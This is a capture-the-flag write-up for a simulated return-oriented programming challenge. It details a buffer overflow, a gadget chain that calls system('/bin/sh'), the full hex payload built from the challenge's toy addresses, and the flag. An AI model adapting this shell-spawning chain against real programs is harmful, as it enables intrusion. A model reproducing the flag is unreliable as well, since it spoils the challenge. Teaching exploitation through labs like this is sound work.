# 28 - ROPChain

## Description
A simulation of a Return-Oriented Programming (ROP) challenge. You must construct a chain of gadgets on the stack to prepare the `rdi` and `rsi` registers before calling `system()`.

## Vulnerability
The program suffers from a buffer overflow that lets you overwrite the return address. However, unlike simpler challenges, there is no single `win()` function. You must call `system("/bin/sh", 0)`.
In x86-64 Linux calling convention, the first argument is passed in `rdi` and the second in `rsi`.

## Exploit
We need to construct a stack that looks like this:
1. `40 bytes` of padding (32 bytes buffer + 8 bytes saved RBP)
2. `pop rdi; ret;` gadget address
3. `'/bin/sh'` string address (this gets popped into RDI)
4. `pop rsi; ret;` gadget address
5. `0x0` (this gets popped into RSI)
6. `system()` address

**Addresses provided by the challenge:**
- `pop rdi; ret;` = `0x400010`
- `pop rsi; ret;` = `0x400020`
- `'/bin/sh'`     = `0x400030`
- `system()`      = `0x400040`

**Payload construction (Little Endian):**
- Padding: `41` * 40
- pop rdi: `1000400000000000`
- /bin/sh: `3000400000000000`
- pop rsi: `2000400000000000`
- 0x0:     `0000000000000000`
- system:  `4000400000000000`

Hex Payload:
`4141414141414141414141414141414141414141414141414141414141414141414141414141414110004000000000003000400000000000200040000000000000000000000000004000400000000000`

Send this hex string when prompted.

**Flag:** `FCTF{r0p_ch41n_m4st3r_g4dg3ts}`
